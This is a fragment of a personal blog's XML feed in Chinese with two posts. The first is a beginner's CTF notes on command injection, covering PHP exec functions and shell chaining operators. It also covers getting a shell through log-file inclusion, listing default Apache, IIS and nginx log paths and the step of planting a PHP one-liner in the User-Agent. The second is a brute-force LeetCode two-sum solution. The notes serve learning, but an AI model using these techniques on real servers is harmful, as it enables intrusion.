        <content type="html"><![CDATA[<p>#前言<br>用这个来记录做题时所遇到的漏洞吧。</p><span id="more"></span><p><em>命令执行漏洞</em></p><br>命令执行漏洞是指服务器没有对执行的命令进行过滤，用户可以随意执行系统命令，命令执行漏洞属于高危漏洞之一。<br>如php的命令执行漏洞主要是基于一些函数的参数过滤不足导致的，可以执行命令的函数有system，exec，shell-exec，passthru，pcntl-execl，popen，proc-open等。<br>漏洞的原理<br>在操作系统中， & 、&& 、| 、 || 都可以作为命令连接符使用，用户通过浏览器提交执行命令，由于服务器端没有针对执行函数做过滤，导致在没有指定绝对路径的情况下就执行命令<br><em>注解</em><br>A&&B   先执行A，执行成功后执行B，否则不执行B<br>A|B    只执行B<br>A&B    先执行A，不管是否成功，都会执行B<br>A;B    先执行A，再执行B<br>A&B    简单拼接，A B之间无制约关系<br>但是有时做题会出现过滤现象，要一个一个试试，然后%0A也可以实现拼接<br><p><em>包含日志文件getshell</em></p><br><h1>包含日志文件漏洞利用概述</h1>当我们没有上传点，并且也没有url_allow_include功能时，我们就可以考虑包含服务器的日志文件。利用思路也比较简单，当我们访问网站时，服务器的日志都会记录我们的行为，当我们访问链接中包含php一句话木马时，也会被记录到日志中去，这时候我们如果知道服务器的日志文职，我们可以去包含这个文件从而拿到shell（shell是一个用c语言编写的程序，它是用户使用linux的桥梁。这个应用程序提供了一个界面，用户通过这个姐买你访问操作系统的系统内核服务）。其实整个"包含日志文件漏洞利用"最关键的就是找到日志存放的"物理路径",只要找到日志的物理存放路径，一切就可以按部就班的完成利用了。<h1>漏洞利用条件</h1><ul><li>日志的物理存放路径</li><li>存在文件包含漏洞</li></ul><h1>获得日志存放路径</h1><ol><li>apache+linux日志默认·存放路径<br>/etc/httpd/logs/access_log<br>/var/log/httpd/access_log</li><li>apache+win2003默认路径<br>D:\xampp\apache\logs\access.log<br>D：\xampp\apache\logs\eror.log<br><li>iis6.0+win2003 默认日志文件<br>C：\WINDOWS\system32\Logfiles<li>iis6.0+win2003默认文件<br>  %SystemDrive%\inetpub\logs\LogFiles<br><li>nginx日志文件<br>日志文件在用户安装目录logs目录下<br>若安装路径为/usr/local/nginx<br>则日志目录就是在/usr/local/nginx/logs里<br><p>然后我们就可以在user-agent那里添加我们的木马，然后链接得到shell</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>力扣两数之和</title>
      <link href="/2020/11/20/%E5%8A%9B%E6%89%A3%E4%B8%A4%E6%95%B0%E4%B9%8B%E5%92%8C/"/>
      <url>/2020/11/20/%E5%8A%9B%E6%89%A3%E4%B8%A4%E6%95%B0%E4%B9%8B%E5%92%8C/</url>
      
        <content type="html"><![CDATA[<p>#前言<br>力扣两数之和的暴力解法，，，小白暂时只会暴力解法</p><span id="more"></span><p>第一次写博客，内心有点小激动，毕竟手搭博客废了我好长时间。<br>这道题，毕竟我现有的知识有限，害，还是慢慢学吧，现在还只会最简单的方法。<br>class是类，solution是类名，切记{}；这个分号不能忘。这道题用了遍历数组的方法，i的下标数开始是0，然后加一不能超过数组的长度在减1，然后i++我的理解是，这不是从0开始的，当然要减去一啊，然后j=i+1，长度不能超过数组j++有一点我不大明白为啥子j不能从1开始，不都是遍历一遍吗。可能是我的知识有限，我还是下去再研究研究。<br>class Solution {<br>public:<br>    vector<int> twoSum(vector<int>&amp; nums, int target) {<br>        int i,j;<br>        for(i = 0;i&lt;nums.size() - 1;i++)<br>        {<br>            for (j = i+1;j&lt;nums.size(); j++)<br>            {<br>                if (nums[i] + nums[j] == target)<br>                {<br>                    return{i,j};<br>                }<br>            }<br>        }<br>         return{i,j};<br>    }<br>};</p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
